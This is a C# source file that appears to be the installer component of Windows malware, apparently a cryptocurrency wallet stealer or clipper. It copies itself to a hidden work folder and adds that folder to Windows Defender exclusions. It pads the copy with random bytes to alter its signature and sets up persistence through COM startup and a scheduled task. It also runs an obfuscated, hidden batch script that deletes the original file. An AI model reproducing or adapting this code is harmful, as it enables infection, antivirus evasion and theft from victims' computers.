using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Stub.Startup;
using Stub.Help;
using System.Windows.Forms;
using Stub.Help.Native;

namespace Stub
{
    class Install
    {
        public static void Run()
        {
            if (!MyPath())
            {
                if (!File.Exists(HELP_String.workFile.FullName))
                {
                    Console.WriteLine(HELP_String.workFile.FullName);
                    List<Thread> thr = new List<Thread>
                    {
                      new Thread(() => Copy()),
                      new Thread(() => COMStartup.ComAddToStartup(HELP_String.workFile.FullName, Config.taskName)),
                      new Thread(() => TaskCreat.Set()),
                    };
                    foreach (Thread t in thr)
                        t.Start();
                    foreach (Thread t in thr)
                        t.Join();
                    Process.Start(HELP_String.workFile.FullName);
                    if (Config.sourcefileDelete)
                        source_Build_Del();
                    else
                        Environment.Exit(0);
                }
            }
            Correctness.CorrectnessWallets();
        }

        public static void Copy()
        {
            HELP_String.workPatch = Directory.CreateDirectory(HELP_String.workPatch.FullName);
            Directory.CreateDirectory(HELP_String.workPatch.FullName);
            HELP_String.workPatch.Refresh();
            Protections.AddFolderToDefenderExclusions(HELP_String.workPatch.FullName);

            try
            {
                if (Config.AddBytes)
                {
                    FileStream fs = new FileStream(HELP_String.workFile.FullName, FileMode.OpenOrCreate);
                    byte[] byte_exe = File.ReadAllBytes(HELP_String.currentProcess);
                    fs.Write(byte_exe, 0, byte_exe.Length);
                    byte[] addB = new byte[new Random().Next(Config.Addbkb * 1024, Config.Addbkb * 1024)];
                    new Random().NextBytes(addB);
                    fs.Write(addB, 0, addB.Length);
                    fs.Dispose();
                }
                else { File.Copy(HELP_String.currentProcess, HELP_String.workFile.FullName); }
            }
            catch { File.Copy(HELP_String.currentProcess, HELP_String.workFile.FullName); }
        }
        public static bool MyPath()
        {
            return HELP_String.currentProcess == HELP_String.workFile.FullName ? true : false;
        }
        public static void source_Build_Del()
        {
            string batch = Path.GetTempFileName() + ".cmd";
            using (StreamWriter sw = new StreamWriter(batch))
            {
                sw.WriteLine("%@%e%c%h%o% %o%f%f%".Replace("%", ""));
                sw.WriteLine("%t%i%m%e%o%u%t% %6% %>% %N%U%L%".Replace("%", ""));
                sw.WriteLine("CD " + Application.StartupPath);
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
                sw.WriteLine("CD " + Path.GetTempPath());
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
            }

            Process.Start(new ProcessStartInfo()
            {
                FileName = batch,
                CreateNoWindow = true,
                ErrorDialog = false,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });
            Environment.Exit(0);
        }
    }
}
